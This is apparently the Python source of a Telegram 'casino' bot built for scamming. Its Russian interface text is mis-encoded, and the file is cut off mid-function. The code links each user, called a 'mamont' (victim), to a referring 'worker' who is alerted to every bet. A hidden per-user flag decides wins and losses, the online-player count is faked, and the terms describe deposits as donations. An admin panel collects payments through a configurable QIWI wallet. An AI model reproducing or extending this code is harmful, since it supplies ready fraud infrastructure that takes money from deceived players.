import logging
from aiogram import Bot, Dispatcher, executor, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from keyboards import *
from aiogram.dispatcher.filters import Text
from database import default_setting, all_users, workers, Pay, promo, root
from states import mamont_edit_pay, qiwi_token, qiwi_phone, costing, promokods, ecn_add, bring, bring_requisites, \
    setMamont, setPromo, mamont_edit_balance,rnd_numchik,kubik_casino,crash
import string
import random
import requests
from config import *
import asyncio
from aiogram import types

bot = Bot(token=telegram_token)
dp = Dispatcher(bot, storage=MemoryStorage())
logging.basicConfig(level=logging.INFO)

channel = -1001526195268

storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

def id_generator(size=12, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


async def get_history():
    pays = Pay.get(Pay.id == 1)
    phone = pays.qiwi_number
    token = pays.qiwi_token
    s = requests.Session()
    s.headers['authorization'] = 'Bearer ' + token

    parameters = {
        'rows': 4,
        'operation': 'IN'
    }

    h = s.get(f'https://edge.qiwi.com/payment-history/v2/persons/{str(phone)}/payments', params=parameters)
    return h.json()


@dp.message_handler(commands='admins')
async def admins(message: types.Message):
    information_adm = default_setting.get(default_setting.id == 1)

    if root.get_or_none(root.admin == message.from_user.id):
        admin_panel = types.InlineKeyboardMarkup()
        if information_adm.pay_status == 0:
            status = types.InlineKeyboardButton("–°—Ç–∞—Ç—É—Å –ø–ª–∞—Ç–µ–∂–µ–π ‚úÖÔ∏è", callback_data='status')
        else:
            status = types.InlineKeyboardButton("–°—Ç–∞—Ç—É—Å –ø–ª–∞—Ç–µ–∂–µ–π üõëÔ∏è", callback_data='status')
        admin_panel.add(types.InlineKeyboardButton("–ò–∑–º–µ–Ω–∏—Ç—å –Ω–æ–º–µ—Ä –∫–∏–≤–∏", callback_data='qiwi_phone'),
                        types.InlineKeyboardButton("–ò–∑–º–µ–Ω–∏—Ç—å —Ç–æ–∫–µ–Ω", callback_data='qiwi_token'))
        admin_panel.add(status)
        await bot.send_message(message.chat.id, '–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!',
                               reply_markup=admin_panel)
    else:
        pass


@dp.callback_query_handler(text='status')
async def send_p(call: types.CallbackQuery):
    information_adm = default_setting.get(default_setting.id == 1)
    infor = default_setting.get(default_setting.id == 1)
    if infor.pay_status == 0:
        infor.pay_status += 1
    else:
        infor.pay_status -= 1
    infor.save()
    if root.get_or_none(root.admin == call.from_user.id):
        admin_panel = types.InlineKeyboardMarkup()
        qiwi_number = types.InlineKeyboardButton("–ò–∑–º–µ–Ω–∏—Ç—å –Ω–æ–º–µ—Ä –∫–∏–≤–∏", callback_data='qiwi_phone')
        token_qiwi = types.InlineKeyboardButton("–ò–∑–º–µ–Ω–∏—Ç—å —Ç–æ–∫–µ–Ω", callback_data='qiwi_token')
        if information_adm.pay_status == 0:
            status = types.InlineKeyboardButton("–°—Ç–∞—Ç—É—Å –ø–ª–∞—Ç–µ–∂–µ–π ‚úÖÔ∏è", callback_data='status')
        else:
            status = types.InlineKeyboardButton("–°—Ç–∞—Ç—É—Å –ø–ª–∞—Ç–µ–∂–µ–π üõëÔ∏è", callback_data='status')
        admin_panel.add(qiwi_number, token_qiwi)
        admin_panel.add(status)
        await call.message.edit_text('–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!',
                                         reply_markup=admin_panel)
    else:
        pass


@dp.callback_query_handler(text='qiwi_token')
async def input_token(call: types.CallbackQuery):
    await call.message.delete()
    if root.get_or_none(root.admin == call.message.chat.id):
        await bot.send_message(call.message.chat.id, '–í–≤–µ–¥–∏—Ç–µ —Ç–æ–∫–µ–Ω: ')
    await qiwi_token.token.set()


@dp.message_handler(content_types=['text'], state=qiwi_token)  # –ü—Ä–∏–Ω–∏–º–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ
async def set_token(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data['token'] = message.text
    await state.finish()
    token1 = Pay.get(Pay.id == 1)
    token1.qiwi_token = data['token']
    token1.save()
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton('–ù–∞–∑–∞–¥', callback_data='back_to_admin'))
    await bot.send_message(message.chat.id, '‚úÖÔ∏è–ò–∑–º–µ–Ω–µ–Ω–æ', parse_mode='Markdown', reply_markup=keyboard)


@dp.callback_query_handler(text='qiwi_phone')
async def input_number(call: types.CallbackQuery):
    if root.get_or_none(root.admin == call.message.chat.id):
        await call.message.edit_text('–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –∫–∏–≤–∏ –≤ —Ñ–æ—Ä–º–∞—Ç–µ 79943299923')
    await qiwi_phone.number.set()


@dp.message_handler(content_types=['text'], state=qiwi_phone)  # –ü—Ä–∏–Ω–∏–º–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ
async def set_number(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data['number'] = message.text
    await state.finish()

    qiwi_kos = Pay.get(Pay.id == 1)
    qiwi_kos.qiwi_number = data['number']
    qiwi_kos.save()
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton('–ù–∞–∑–∞–¥', callback_data='back_to_admin'))
    await bot.send_message(message.chat.id, '‚úÖÔ∏è–ò–∑–º–µ–Ω–µ–Ω–æ', parse_mode='Markdown', reply_markup=keyboard)


@dp.callback_query_handler(text="back_to_admin")
async def back_to_admin(call: types.CallbackQuery):
    information_adm = default_setting.get(default_setting.id == 1)
    if root.get_or_none(root.admin == call.from_user.id):
        admin_panel = types.InlineKeyboardMarkup()
        if information_adm.pay_status == 0:
            status = types.InlineKeyboardButton("–°—Ç–∞—Ç—É—Å –ø–ª–∞—Ç–µ–∂–µ–π ‚úÖÔ∏è", callback_data='status')
        else:
            status = types.InlineKeyboardButton("–°—Ç–∞—Ç—É—Å –ø–ª–∞—Ç–µ–∂–µ–π üõëÔ∏è", callback_data='status')
        admin_panel.add(types.InlineKeyboardButton("–ò–∑–º–µ–Ω–∏—Ç—å –Ω–æ–º–µ—Ä –∫–∏–≤–∏", callback_data='qiwi_phone'),
                            types.InlineKeyboardButton("–ò–∑–º–µ–Ω–∏—Ç—å —Ç–æ–∫–µ–Ω", callback_data='qiwi_token'))
        admin_panel.add(status)
        await call.message.edit_text('–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!', reply_markup=admin_panel)
    else:
        pass


@dp.message_handler(commands='work')
async def new_worker(message: types.Message):
    if not workers.get_or_none(workers.user_id == message.from_user.id):
        workers.create(user_id=message.from_user.id)


@dp.message_handler(commands="start")
async def start_message(message: types.Message):
    args = message.text.split()
    if not all_users.get_or_none(all_users.user_id == message.from_user.id):
        if len(args) == 2:
            code = args[1]

            if message.from_user.username is None:
                all_users.create(user_id=message.chat.id, username=message.from_user.first_name, worker=code,
                                 worker_ref=code,
                                 id_mamont=message.chat.id)
            else:
                all_users.create(user_id=message.chat.id, username=message.from_user.username, worker=code,
                                 worker_ref=code,
                                 id_mamont=message.chat.id)

            await bot.send_message(int(code), '‚úÖ –£ –≤–∞—Å –Ω–æ–≤—ã–π –º–∞–º–æ–Ω—Ç')
        else:
            if message.from_user.username is None:
                all_users.create(user_id=message.chat.id, username=message.from_user.first_name)
            else:
                all_users.create(user_id=message.chat.id, username=message.from_user.username)

        text = f'''
‚úÖ–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π!

–ü–æ–ª–∏—Ç–∏–∫–∞ –∏ —É—Å–ª–æ–≤–∏—è –ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –¥–∞–Ω–Ω—ã–º –±–æ—Ç–æ–º.

1. –ò–≥—Ä–∞—è —É –Ω–∞—Å, –≤—ã –±–µ—Ä—ë—Ç–µ –≤—Å–µ —Ä–∏—Å–∫–∏ –∑–∞ —Å–≤–æ–∏ —Å—Ä–µ–¥—Å—Ç–≤–∞ –Ω–∞ —Å–µ–±—è.
2. –ü—Ä–∏–Ω–∏–º–∞—è –ø—Ä–∞–≤–∏–ª–∞, –í—ã –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç–µ —Å–≤–æ—ë —Å–æ–≤–µ—Ä—à–µ–Ω–Ω–æ–ª–µ—Ç–∏–µ!
3. –í–∞—à –∞–∫–∫–∞—É–Ω—Ç –º–æ–∂–µ—Ç –±—ã—Ç—å –∑–∞–±–∞–Ω–µ–Ω –≤ –ø–æ–¥–æ–∑—Ä–µ–Ω–∏–∏ –Ω–∞ –º–æ—à–µ–Ω–Ω–∏—á–µ—Å—Ç–≤–æ / –æ–±–º–∞–Ω –Ω–∞—à–µ–π —Å–∏—Å—Ç–µ–º—ã
4. –ú—É–ª—å—Ç–∏–∞–∫–∫–∞—É–Ω—Ç—ã –∑–∞–ø—Ä–µ—â–µ–Ω—ã!
5. –°–∫—Ä–∏–ø—Ç—ã, —Å—Ö–µ–º—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∑–∞–ø—Ä–µ—â–µ–Ω–æ!
6. –ï—Å–ª–∏ –±—É–¥—É—Ç –≤—ã—è–≤–ª–µ–Ω—ã –≤—ã—à–µ–ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–Ω—ã–µ —Å–ª—É—á–∞–∏, –í–∞—à –∞–∫–∫–∞—É–Ω—Ç –±—É–¥–µ—Ç –∑–∞–º–æ—Ä–æ–∂–µ–Ω –¥–æ –≤—ã—è—Å–Ω–µ–Ω–∏—è –æ–±—Å—Ç–æ—è—Ç–µ–ª—å—Å—Ç–≤!
7. –í —Å–ª—É—á–∞–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏—è –∏–º–µ–µ—Ç –ø—Ä–∞–≤–æ –∑–∞–ø—Ä–æ—Å–∏—Ç—å —É –í–∞—Å –¥–æ–∫—É–º–µ–Ω—Ç—ã, –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—é—â–∏–µ –í–∞—à—É –ª–∏—á–Ω–æ—Å—Ç—å –∏ –í–∞—à–µ —Å–æ–≤–µ—Ä—à–µ–Ω–Ω–æ–ª–µ—Ç–∏–µ.

–í—ã –∏–≥—Ä–∞–µ—Ç–µ –Ω–∞ –≤–∏—Ä—Ç—É–∞–ª—å–Ω—ã–µ –º–æ–Ω–µ—Ç—ã, –ø–æ–∫—É–ø–∞—è –∏—Ö –∑–∞ –Ω–∞—Å—Ç–æ—è—â–∏–µ –¥–µ–Ω—å–≥–∏. –õ—é–±–æ–µ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–µ –±–æ—Ç–∞ —è–≤–ª—è–µ—Ç—Å—è –ø–æ–∂–µ—Ä—Ç–≤–æ–≤–∞–Ω–∏–µ–º! –ü–æ –≤—Å–µ–º –≤–æ–ø—Ä–æ—Å–∞–º –í—ã–≤–æ–¥–∞ —Å—Ä–µ–¥—Å—Ç–≤, –ø–æ –≤–æ–ø—Ä–æ—Å–∞–º –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è, –∞ —Ç–∞–∫ –∂–µ –≤–æ–ø—Ä–æ—Å–∞–º –∏–≥—Ä –æ–±—Ä–∞—â–∞–π—Ç–µ—Å—å –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É, —É–∫–∞–∑–∞–Ω–Ω—É—é –≤ –±–æ—Ç–µ
–ü–∏—à–∏—Ç–µ —Å—Ä–∞–∑—É –ø–æ –¥–µ–ª—É, –∞ –Ω–µ ¬´–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ! –¢—É—Ç?¬ª
–°—Ç–∞—Ä–∞–π—Ç–µ—Å—å –∏–∑–ª–æ–∂–∏—Ç—å —Å–≤–æ–∏ –º—ã—Å–ª–∏ —á–µ—Ç–∫–æ –∏ —è—Å–Ω–æ, —á—Ç–æ–±—ã –ø–æ–¥–¥–µ—Ä–∂–∫–∞ –Ω–µ –º—É—á–∞–ª–∞—Å—å –∏ –Ω–µ –ø—ã—Ç–∞–ª–∞—Å—å –í–∞—Å –ø–æ–Ω—è—Ç—å.

–°–ø–∞—Å–∏–±–æ –∑–∞ –ø–æ–Ω–∏–º–∞–Ω–∏–µ!
–£–¥–∞—á–∏!
            '''
        await message.answer(text, reply_markup=keyboard_accept_license)

    else:
        profile = all_users.get(all_users.user_id == message.from_user.id)
        if profile.verif == 0:
            text = f'''
üì≤ –í–∞—à –ª–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç

üí∞–î–µ–Ω–µ–∂–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance} ‚ÇΩ
ü§ù –°–¥–µ–ª–æ–∫: {profile.offer}

üìë –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è: ‚ùå

üÜî –í–∞—à ID: {profile.user_id}
üìà –ê–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –æ–Ω–ª–∞–π–Ω: {random.randint(1950, 2050)}
                    '''

        else:
            text = f'''
üì≤ –í–∞—à –ª–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç

üí∞–î–µ–Ω–µ–∂–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance} ‚ÇΩ
ü§ù –°–¥–µ–ª–æ–∫: {profile.offer}

üìë –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è: ‚úÖ

üÜî –í–∞—à ID: {profile.user_id}
üìà –ê–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –æ–Ω–ª–∞–π–Ω: {random.randint(1950, 2050)}


                                '''

        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
        keyboard.add(types.KeyboardButton(text='üé∞ –ò–≥—Ä–∞—Ç—å'), types.InlineKeyboardButton(text='üíº –ü—Ä–æ—Ñ–∏–ª—å'))
        keyboard.add(types.KeyboardButton(text='üí≥ –ü–æ–ø–æ–ª–Ω–∏—Ç—å'),
                     types.KeyboardButton(text='üè¶ –í—ã–≤–µ—Å—Ç–∏'))
        keyboard.add(types.KeyboardButton('‚öô–û–±—Ä–∞—Ç–Ω–∞—è —Å–≤—è–∑—å‚öô '))







        if workers.get_or_none(workers.user_id == message.from_user.id):
            keyboard.add(types.KeyboardButton(text='‚ö°Ô∏è –ú–µ–Ω—é –≤–æ—Ä–∫–µ—Ä–∞', callback_data="workers_menu"))
        await message.reply(text='–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å üëã',reply_markup=keyboard)
        await message.answer_photo(photo=open('images/profile.jpg', 'rb'), caption=text)



@dp.callback_query_handler(text="accept_licence")
async def accept_licence(call: types.CallbackQuery):
    await call.message.delete()
    profile = all_users.get(all_users.user_id == call.from_user.id)
    if profile.verif == 0:
        text = f'''
üì≤ –í–∞—à –ª–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç

üí∞–î–µ–Ω–µ–∂–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance} ‚ÇΩ
ü§ù –°–¥–µ–ª–æ–∫: {profile.offer}

üìë –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è: ‚ùå

üÜî –í–∞—à ID: {profile.user_id}
üìà –ê–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –æ–Ω–ª–∞–π–Ω: {random.randint(1950, 2050)}




                        '''

    else:
        text = f'''
üì≤ –í–∞—à –ª–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç

üí∞–î–µ–Ω–µ–∂–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance} ‚ÇΩ
ü§ù –°–¥–µ–ª–æ–∫: {profile.offer}

üìë –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è: ‚ùå

üÜî –í–∞—à ID: {profile.user_id}
üìà –ê–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –æ–Ω–ª–∞–π–Ω: {random.randint(1950, 2050)}
                                    '''

    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add(types.KeyboardButton(text='üé∞ –ò–≥—Ä–∞—Ç—å'), types.KeyboardButton(text='üíº –ü—Ä–æ—Ñ–∏–ª—å'))
    keyboard.add(types.KeyboardButton(text='üí≥ –ü–æ–ø–æ–ª–Ω–∏—Ç—å'),
                 types.KeyboardButton(text='üè¶ –í—ã–≤–µ—Å—Ç–∏'))
    keyboard.add(types.KeyboardButton(text='‚öô–û–±—Ä–∞—Ç–Ω–∞—è —Å–≤—è–∑—å‚öô'))
    if workers.get_or_none(workers.user_id == call.from_user.id):
        keyboard.add(types.KeyboardButton(text='‚ö°Ô∏è –ú–µ–Ω—é –≤–æ—Ä–∫–µ—Ä–∞', callback_data="workers_menu"))

    await call.message.answer_photo(photo=open('images/profile.jpg', 'rb'), caption=text,
                                    reply_markup=keyboard)


@dp.message_handler(Text(equals="‚öô–û–±—Ä–∞—Ç–Ω–∞—è —Å–≤—è–∑—å‚öô"), state="*")
async def ecn(message: types.Message):
    tps = types.InlineKeyboardMarkup()
    tps.add(types.InlineKeyboardButton('üõ†Ô∏è –¢–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫–∞ üõ†Ô∏è', url='https://t.me/1'))

    text = '''
    üõ†Ô∏è –ù–∞—à–∞ –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω–∞—è —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–∞—è –ø–æ–¥–¥–µ—Ä–∂–∫–∞
    '''
    await message.answer_photo(photo=open('images/tps.jpg', 'rb'), caption=text,
                               reply_markup=setting_ru)


@dp.message_handler(Text(equals="üé∞ –ò–≥—Ä–∞—Ç—å"), state="*")
async def ecn(message: types.Message):

    text = '''
–í—ã–±–µ—Ä–∏—Ç–µ –∏–≥—Ä—É –≤ –∫–æ—Ç—Ä—É—é —Ö–æ—Ç–∏—Ç–µ —Å—ã–≥—Ä–∞—Ç—å:'''

    await message.answer_photo(photo=open('images/game.jpg', 'rb'), caption=text,
                               reply_markup=ecn_btns_ru)



@dp.callback_query_handler(text_contains="game_")
async def valutes_ecn(call: types.CallbackQuery):
    await call.message.delete()
    profile = all_users.get(all_users.user_id == call.from_user.id)
    if profile.freez == 0:
        text = f'üåê –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É, –∫–æ—Ç–æ—Ä—É—é —Ö–æ—Ç–∏—Ç–µ –∏–Ω–≤–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å.' \
                   f'\n' \
                   f'\n–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ —Å—Ç–∞–≤–∫–∏: 500‚ÇΩ' \
                   f'\n' \
                   f'\n–í–∞—à –¥–µ–Ω–µ–∂–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ'

        if profile.balance < 500:
            await call.message.answer_photo(photo=open(image, 'rb'), caption=text)

        else:
            text = f'üåê –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É, –∫–æ—Ç–æ—Ä—É—é —Ö–æ—Ç–∏—Ç–µ –∏–Ω–≤–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å.' \
                   f'\n' \
                   f'\n–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ —Å—Ç–∞–≤–∫–∏: 500‚ÇΩ' \
                   f'\n' \
                   f'\n–í–∞—à –¥–µ–Ω–µ–∂–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ'

            await ecn_add.summ.set()
            await call.message.answer_photo(photo=open(image, 'rb'), caption=text)
    else:
        await call.message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*',  parse_mode='Markdown')


@dp.message_handler(content_types=['text'], state=crash)  # –ü—Ä–∏–Ω–∏–º–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ
async def add_depos(message: types.Message, state: FSMContext):
    try:
        profile = all_users.get(all_users.user_id == message.from_user.id)
        async with state.proxy() as data:
            data['summ'] = message.text
        await state.finish()

        if int(data['summ']) < 500 or int(data['summ']) > profile.balance:
            await message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')
        else:
            crash_money = 0.0
            max_crash = random.uniform(0,100)
            text = 'ü§µ –°—Ç–∞–≤–∫–∞ –∑–∞—Å—á–∏—Ç–∞–Ω–∞, —Å–ª–µ–¥–∏—Ç–µ –∑–∞ –∫–æ—ç—Ñ—Ñ–∏—Ü–∏–µ–Ω—Ç–æ–º –∏ –∑–∞–±–µ—Ä–∏—Ç–µ –¥–µ–Ω—å–≥–∏ –≤–æ–≤—Ä–µ–º—è!'
            ratio_ru = types.InlineKeyboardMarkup(row_width=3)
            ratio_ru.add(types.InlineKeyboardButton('üìà Start Crash', callback_data=f'crash_{data["summ"]}'))
            await message.answer(text, reply_markup=ratio_ru)

    except Exception as err:
        print(err)
        await message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')


@dp.callback_query_handler(text_contains='CRASH_', state="*")
async def rnd_num_gamescam(call: types.CallbackQuery):

    state = dp.current_state()
    await state.set_state('crash_stopped')
    
    #crash_money_summ = call.data.split('_')
    #index_mon = crash_money_summ[1].index(':')
    #summ = crash_money_summ[1][index_mon + 1:]
    #crash_money = crash_money_summ[1][0:index_mon]
    #profile = all_users.get(all_users.user_id == call.from_user.id)
    #summ = int(summ)
    #crash_money = round(float(crash_money))
    #profile.balance = profile.balance + (int(summ) * int(crash_money))
    #profile.save()
    #text=f'''
#üòÉ –í—ã –≤—ã–π–≥—Ä–∞–ª–∏ {int(summ) * int(crash_money)} üòÉ
#üíµ –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞: {summ} RUB [X4]'''
    #await bot.send_message(call.from_user.id,text)

#@dp.callback_query_handler(text_contains='CRASH_')
#async def rnd_num_gamescam(call: types.CallbackQuery):
#    global stopped
#    crash_money_summ = call.data.split('_')
#    index_mon = crash_money_summ[1].index(':')
#    summ = crash_money_summ[1][index_mon + 1:]
#    crash_money = crash_money_summ[1][0:index_mon]
#    stopped = True
#    profile = all_users.get(all_users.user_id == call.from_user.id)
#    profile.balance = int(summ) * int(crash_money)
#    profile.save()
#    await call.message.delete()
    
#    text=f'''
#üòÉ –í—ã –≤—ã–π–≥—Ä–∞–ª–∏ {int(summ) * int(crash_money)} üòÉ
#üíµ –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞: {summ} RUB [X4]
#üìà –ì—Ä–∞—Ñ–∏–∫: {max_crash}x'''
#    await bot.send_message(call.from_user.id,text)

@dp.callback_query_handler(text_contains="crash_", state="*")
async def crash_casik(call: types.CallbackQuery):
    try:
        crash_money = 0.0
        max_crash = 15
        summ = call.data.split('_')[1]
        int(summ)
        profile = all_users.get(all_users.user_id == call.from_user.id)
        if profile.fart == 0:
            
            profile.balance = profile.balance - int(summ)
            profile.save()
            text=f'''
üòï –ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, –≤—ã –ø—Ä–æ–∏–≥—Ä–∞–ª–∏ üòï
üíµ –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞: {summ} RUB
üìà –ì—Ä–∞—Ñ–∏–∫: {round(random.uniform(0.0,0.9),2)}
üí∞ –î–æ—Å—Ç—É–ø–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ'''
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
                                       f'üíü –ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                       f'ID: {profile.user_id}\n'
                                       f'–°–¥–µ–ª–∞–ª —Å—Ç–∞–≤–∫—É –Ω–∞ {summ} ')
            while True:
                crash_money += 0.1
                
                
                call.message.edit_text(f'üìà –ì—Ä–∞—Ñ–∏–∫: {round(crash_money,1)}x\nüí∞ –ë–∞–ª–∞–Ω—Å: {round(float(summ) * crash_money,1)} RUB\n')
                await asyncio.sleep(0.4)
                await call.message.edit_text(text)
                break

        if profile.fart == 1:
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
                                       f'üíü –ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                       f'ID: {profile.user_id}\n'
                                       f'–°–¥–µ–ª–∞–ª —Å—Ç–∞–≤–∫—É –Ω–∞ {summ} ')
            state = dp.current_state()
            await state.set_state('running_crash')
            cur_state = await state.get_state()

            max_crash = 15
            CRASH_STOP = types.InlineKeyboardMarkup()
            CRASH_STOP.add(types.InlineKeyboardButton('STOP CRASH', callback_data=f'CRASH_{crash_money}:{summ}'))
            sent_msg = await call.message.edit_text(f'üìà –ì—Ä–∞—Ñ–∏–∫: {round(crash_money,1)}x\nüí∞ –ë–∞–ª–∞–Ω—Å: {round(float(1) * crash_money,1)} RUB\n',reply_markup=CRASH_STOP)
            while crash_money <= max_crash and cur_state == "running_crash":
                await asyncio.sleep(0.8)
                crash_money += 0.1
                CRASH_STOP = types.InlineKeyboardMarkup()
                CRASH_STOP.add(types.InlineKeyboardButton('STOP CRASH', callback_data=f'CRASH_{crash_money}:{summ}')) 
                
                await sent_msg.edit_text(f'üìà –ì—Ä–∞—Ñ–∏–∫: {round(crash_money,1)}x\nüí∞ –ë–∞–ª–∞–Ω—Å: {round(float(summ) * crash_money,1)} RUB\n',reply_markup=CRASH_STOP)
                cur_state = await state.get_state()
            profile = all_users.get(all_users.user_id == call.from_user.id)
            profile.balance = profile.balance + (float(summ) * round(float(crash_money),1))
            profile.save()
            await call.message.delete()
            text=f'''
üòÉ –í—ã –≤—ã–π–≥—Ä–∞–ª–∏ {float(summ) * round(float(crash_money),1)} üòÉ
üíµ –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞: {summ} RUB'''
            await bot.send_message(call.from_user.id,text)


            #print(max_crash)
            #if not (profile.worker is None):
            #    await bot.send_message(profile.worker,
            #                           f'üíü –ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
            #                           f'ID: {profile.user_id}\n'
            #                           f'–°–¥–µ–ª–∞–ª —Å—Ç–∞–≤–∫—É –Ω–∞ {summ} ')
            #while crash_money <= max_crash:
            #    await asyncio.sleep(0.8)
            #    crash_money += 0.1
            #    CRASH_STOP = types.InlineKeyboardMarkup()
            #    CRASH_STOP.add(types.InlineKeyboardButton('STOP CRASH', callback_data=f'CRASH_{crash_money}:{summ}'))
            #    await call.message.edit_text(f'üìà –ì—Ä–∞—Ñ–∏–∫: {round(crash_money,1)}x\nüí∞ –ë–∞–ª–∞–Ω—Å: {round(float(summ) * crash_money,1)} RUB\n',reply_markup=CRASH_STOP)

            #profile.balance = profile.balance + (int(summ) * int(crash_money))
            #profile.save()
            #await call.message.delete()
            #text=f'''
#üòÉ –í—ã –≤—ã–π–≥—Ä–∞–ª–∏ {int(summ) * int(crash_money)} üòÉ
#üíµ –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞: {summ} RUB [X4]
#üìà –ì—Ä–∞—Ñ–∏–∫: {max_crash}x'''
            #await bot.send_message(call.from_user.id,text)
            
        if profile.fart == 2:
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
                                       f'üíü –ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                       f'ID: {profile.user_id}\n'
                                       f'–°–¥–µ–ª–∞–ª —Å—Ç–∞–≤–∫—É –Ω–∞ {summ} ')
            state = dp.current_state()
            await state.set_state('running_crash')
            cur_state = await state.get_state()

            max_crash = random.randint(0,2)
            print(max_crash)
            CRASH_STOP = types.InlineKeyboardMarkup()
            CRASH_STOP.add(types.InlineKeyboardButton('STOP CRASH', callback_data=f'CRASH_{crash_money}:{summ}'))
            sent_msg = await call.message.edit_text(f'üìà –ì—Ä–∞—Ñ–∏–∫: {round(crash_money,1)}x\nüí∞ –ë–∞–ª–∞–Ω—Å: {round(float(1) * crash_money,1)} RUB\n',reply_markup=CRASH_STOP)
            while crash_money <= max_crash and cur_state == "running_crash":
                crash_money += 0.1
                print(crash_money)
                if crash_money >= max_crash:
                    profile = all_users.get(all_users.user_id == call.from_user.id)
                    profile.balance = profile.balance - int(summ)
                    text=f'''
üòï –í—ã –ø—Ä–æ–∏–≥—Ä–∞–ª–∏ {int(summ)}‚ÇΩ üòï
üíµ –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞: {summ} RUB
üí∞ –î–æ—Å—Ç—É–ø–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ'''
                    profile.save()
                    await call.message.delete()
                    await bot.send_message(call.from_user.id,text)
                else:
                    await asyncio.sleep(0.8)
                    CRASH_STOP = types.InlineKeyboardMarkup()
                    CRASH_STOP.add(types.InlineKeyboardButton('STOP CRASH', callback_data=f'CRASH_{crash_money}:{summ}'))
                
                await sent_msg.edit_text(f'üìà –ì—Ä–∞—Ñ–∏–∫: {round(crash_money,1)}x\nüí∞ –ë–∞–ª–∞–Ω—Å: {round(float(summ) * crash_money,1)} RUB\n',reply_markup=CRASH_STOP)
                cur_state = await state.get_state()
            profile = all_users.get(all_users.user_id == call.from_user.id)
            profile.balance = profile.balance + (float(summ) * round(float(crash_money),1))
            profile.save()
            await call.message.delete()
            text=f'''
üòÉ –í—ã –≤—ã–π–≥—Ä–∞–ª–∏ {float(summ) * round(float(crash_money),1)} üòÉ
üíµ –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞: {summ} RUB'''
